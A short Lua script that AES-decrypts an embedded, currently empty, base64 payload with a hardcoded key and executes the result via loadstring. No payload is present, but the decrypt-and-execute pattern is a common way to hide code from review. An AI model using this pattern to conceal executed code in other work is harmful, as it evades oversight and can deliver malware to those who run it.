local base64 = [[]]
local key = [[TQfxy6cWAsN6fAUW]]

local function decryptAES(cipherText, key)
    local AES = require("AES")
    return AES.decrypt(cipherText, key)
end

loadstring(decryptAES(base64, key))()
